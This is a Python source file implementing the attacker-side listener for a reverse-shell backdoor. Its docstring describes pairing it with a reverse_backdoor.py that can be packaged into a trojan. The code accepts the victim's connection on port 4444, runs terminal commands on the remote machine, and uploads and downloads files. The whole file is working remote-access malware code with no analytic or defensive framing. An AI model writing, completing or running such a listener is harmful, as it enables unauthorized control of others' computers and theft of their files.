"""backdoor_listener.py - Listener of the backdoor connections coming from other devices.

Listener is responsible for receiving incoming connections from reverse_backdoor.py (which can be placed as standalone
script on other device and run, or properly packaged into executable (i.e. to create trojan) and run the same way.
Listener allows to perform terminal commands on the target device and download.upload files.
"""

import base64
import json
import socket


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Download successful."


# TODO: Add documentation here.
class BackdoorListener:
    # TODO: apparently, IP address is not needed. Read more: https://docs.python.org/3/library/socket.html
    def __init__(self, ip_address: str, port: int = 4444):
        self.terminal = []
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_socket.bind((ip_address, port))
        listener_socket.listen(0)
        print("[+] Waiting for incoming connection...")
        self.connection, address = listener_socket.accept()
        self.terminal.append(f"[+] Connection established! Source: {address}.")
        print(f"[+] Connection established! Source: {address}.")

    def reliable_send(self, data: str):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
        return self.reliable_receive()

    def run_command(self, command):
        command = command.split()

        try:
            if command[0] == "upload":
                file_content = read_file(command[1]).decode()
                command.append(file_content)

            result = self.execute_remotely(command)

            if command[0] == "download" and "[-] Error " not in result:
                result = write_file(command[1], result)
        except Exception:
            if command[0] == "exit":
                result = "[+] The exit signal has been sent to target machine."
            else:
                result = "[-] Error has occurred during command execution."

        self.terminal.append(result)
        print(result)
